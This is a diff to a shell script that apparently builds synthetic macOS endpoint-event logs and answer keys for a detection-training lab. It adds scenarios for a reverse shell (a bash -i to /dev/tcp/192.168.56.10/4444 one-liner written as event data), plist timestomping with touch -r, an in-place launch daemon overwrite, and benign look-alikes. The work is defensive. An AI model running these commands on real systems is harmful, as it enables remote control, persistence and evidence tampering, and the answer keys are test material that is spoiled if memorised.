@@ -183,7 +183,7 @@ proc_obj() {
 
 # ---- events -----------------------------------------------------------------------------------------------------
 # Events go to fd 3 in call order, which must be time order; answer rows go to fd 4.
-EV_exec=9; EV_fork=11; EV_create=13; EV_exit=15; EV_rename=25; EV_btm_launch_item_add=124
+EV_exec=9; EV_fork=11; EV_close=12; EV_create=13; EV_exit=15; EV_rename=25; EV_write=33; EV_btm_launch_item_add=124
 
 # emit SECONDS handle event_name body_json
 emit() {
@@ -217,6 +217,7 @@ ev_fork() {
 ENV_JSON='["HOME=/Users/learner","LANG=C.UTF-8","LOGNAME=learner","PATH=/usr/local/bin:/usr/bin:/bin","SHELL=/bin/zsh","USER=learner"]'
 FDS_tty='[{"fd":0,"fdtype":1},{"fd":1,"fdtype":1},{"fd":2,"fdtype":1}]'
 FDS_pipe='[{"fd":0,"fdtype":6,"pipe":{"pipe_id":100231}},{"fd":1,"fdtype":1},{"fd":2,"fdtype":1}]'
+FDS_socket='[{"fd":0,"fdtype":2},{"fd":1,"fdtype":2},{"fd":2,"fdtype":2}]'
 EXEC_SCRIPT=''   # set before ev_exec for a script run through its interpreter; reset by it
 EXEC_IDS=''      # "ruid euid rgid egid" set before ev_exec for a setuid program; reset by it
 
@@ -269,6 +270,12 @@ ev_create() {
   json_esc "$name"; n=$JSON_OUT
   emit "$1" "$2" create "{\"destination\":{\"new_path\":{\"dir\":$d,\"filename\":$n,\"mode\":33188}},\"destination_type\":1,\"acl\":null}"
 }
+
+# ev_write SECONDS handle path: data written to an existing file.
+ev_write() { file_obj "$3"; emit "$1" "$2" write "{\"target\":$FILE_OUT}"; }
+
+# ev_close SECONDS handle path modified(true|false): a file closed; modified says whether it was changed.
+ev_close() { file_obj "$3"; emit "$1" "$2" close "{\"modified\":$4,\"target\":$FILE_OUT,\"was_mapped_writable\":false}"; }
 
 # ev_rename SECONDS handle from to
 ev_rename() {
@@ -526,6 +533,49 @@ synthetic_story() {
   ev_exit 100.4 "$curl"
   run_as 101.1 "$ZSH" 7651 9651 "$LAB/stage2" adhoc stage2-55554944f0be3f1f '' stage2 --run
   answer dropped dropped-then-executed high queued 'stage2 --run' 'A program written by curl runs a second later from the staging folder, and it is ad-hoc signed: fetch, then run.'
+
+  # 14. A program in the staging folder opens a reverse shell: sh -c wires bash -i to a TCP connection, so bash reads
+  #     its commands from a socket.
+  local svc sh rbash
+  ev_fork 105.0 "$ZSH" 7660 9660; svc=$LAST
+  ev_exec 105.1 "$svc" "$LAB/netsvc" adhoc netsvc-55554944f0be3f1f '' "$CWD" tty netsvc
+  ev_fork 105.5 "$svc" 7661 9661; sh=$LAST
+  ev_exec 105.6 "$sh" /bin/sh platform com.apple.sh '' "$CWD" tty sh -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
+  ev_fork 105.7 "$sh" 7662 9662; rbash=$LAST
+  ev_exec 105.8 "$rbash" /bin/bash platform com.apple.bash '' "$CWD" socket /bin/bash -i
+  answer reverse-shell reverse-shell high queued 'dev/tcp/192.168.56.10' 'sh -c sends bash -i to a TCP connection and takes its input from there: a reverse shell, set up on the command line.'
+  answer reverse-shell reverse-shell high queued '/bin/bash -i' 'The bash it starts reads its commands from a socket: the reverse shell itself, whatever command line made it.'
+
+  #     Two look-alikes that are not reverse shells: a wait-for-database port check, and git started by a node tool
+  #     with a socket for its input (as Node and Electron start child processes).
+  run 106.0 "$ZSH" 7663 9663 /bin/bash bash -c '</dev/tcp/localhost/5432'
+  local node git
+  ev_fork 107.0 "$ZSH" 7664 9664; node=$LAST
+  ev_exec 107.1 "$node" /opt/homebrew/bin/node team org.nodejs.node LAB0NODE01 "$CWD" tty node tools/watch.js
+  ev_fork 107.5 "$node" 7665 9665; git=$LAST
+  ev_exec 107.6 "$git" /usr/bin/git platform com.apple.git '' "$CWD" socket git status --porcelain
+  ev_exit 107.9 "$git"
+
+  # 15. The shell gives the stealer's launch agent plist the dates of an ordinary one, so it does not stand out by date.
+  run 110.0 "$ZSH" 7670 9670 /usr/bin/touch touch -r /Library/LaunchAgents/com.example.agent.plist "$AGENTS/com.learner.syncd.plist"
+  answer timestomp timestomp high queued 'touch -r /Library' 'touch -r copies the dates of another launch agent plist onto the stealer'"'"'s, so it looks as old as its neighbours.'
+  #     Not timestamp faking: a build sets the date of what it just compiled, for reproducible output (context only).
+  local cc
+  ev_fork 111.0 "$ZSH" 7671 9671; cc=$LAST
+  ev_exec 111.1 "$cc" /usr/bin/cc platform com.apple.cc '' /Users/learner/proj tty cc -o build/out.o main.c
+  ev_create 111.2 "$cc" /Users/learner/proj/build/out.o
+  ev_exit 111.3 "$cc"
+  run 112.0 "$ZSH" 7672 9672 /usr/bin/touch touch -t 202001010000 /Users/learner/proj/build/out.o
+
+  # 16. An existing launch daemon plist is overwritten in place (cat with its output redirected onto it): no create
+  #     event, only a write and a close marked modified, seen when the capture records write or close.
+  local ow
+  ev_fork 115.0 "$ZSH" 7680 9680; ow=$LAST
+  ev_exec 115.1 "$ow" /bin/cat platform com.apple.cat '' "$CWD" tty cat /tmp/lab/updater.plist
+  ev_write 115.2 "$ow" /Library/LaunchDaemons/com.example.updater.plist
+  ev_close 115.3 "$ow" /Library/LaunchDaemons/com.example.updater.plist true
+  ev_exit 115.4 "$ow"
+  answer overwrite persistence-plist high queued 'cat /tmp/lab/updater.plist' 'An existing launch daemon plist is overwritten in place: no file is created, so only a write or a modified close shows it.'
 }
 
 # ---- live mode --------------------------------------------------------------------------------------------------
@@ -551,7 +601,8 @@ live_answers() {
     '#   apple-masquerade: the lab will not write a com.apple launch plist, and an unsigned program will not run.' \
     '#   clickfix-paste-chain: the lab will not fetch with curl -k or a custom user agent, or run what it decodes.' \
     '#   risky-parent-spawn for Script Editor, Office and developer tools: the lab opens none of them (only its applet).' \
-    '#   persistence-item med on its own row: needs an app'"'"'s own launch agent.' >&4
+    '#   persistence-item med on its own row: needs an app'"'"'s own launch agent.' \
+    '#   reverse-shell: the lab opens no reverse shell, even to loopback, so endpoint protection is not set off.' >&4
   answer download download med queued 'file:///etc/hosts' 'curl saves a file to disk (from /etc/hosts, so no network is used).'
   answer pipe shell-from-pipe med queued 'bash -s' 'bash runs commands piped into it: no script file on disk to inspect.'
   answer pipe-whoami recon low in-chain whoami 'whoami under the piped bash: in a flagged chain.'
@@ -572,6 +623,7 @@ live_answers() {
   answer orphan orphaned low queued 'sleep 3' 'Its parent exited, so it ends up under launchd.'
   answer persist persistence-item high queued 'agent-template.plist' 'cp writes a launch agent plist into ~/Library/LaunchAgents (removed at the end) and macOS registers it; it runs a shell, so it is high. macOS likely shows a "Background Items Added" notification: that is what a real infection looks like too.'
   answer persist-load launchctl-load high queued 'launchctl bootstrap' 'launchctl starts the job now (it only runs "exit 0").'
+  answer stomp timestomp high queued 'touch -r /etc/hosts' 'touch -r gives the lab'"'"'s launch agent plist the dates of /etc/hosts, so it looks older than it is.'
   answer burst recon low burst sw_vers 'Three discovery tools within a minute under one shell: a recon burst.'
   answer burst recon low burst 'uname -a' 'Part of the same burst.'
   answer burst recon low burst hostname 'Part of the same burst.'
@@ -673,6 +725,7 @@ live_steps() {
   /bin/mkdir -p "$HOME/Library/LaunchAgents"
   step 'launch agent plist written (removed at the end)' /bin/cp "$plist_src" "$HOME/Library/LaunchAgents/$LIVE_LABEL.plist"
   step 'launchctl bootstrap' /bin/launchctl bootstrap "gui/$(id -u)" "$HOME/Library/LaunchAgents/$LIVE_LABEL.plist"
+  step 'plist dates faked' /usr/bin/touch -r /etc/hosts "$HOME/Library/LaunchAgents/$LIVE_LABEL.plist"
   printf '/usr/bin/sw_vers\n/usr/bin/uname -a\n/bin/hostname\n:\n' > "$LAB/recon.sh"
   step 'recon burst' /bin/sh "$LAB/recon.sh"
   step 'ps (setuid root)' /bin/ps -p $$ -o pid,comm
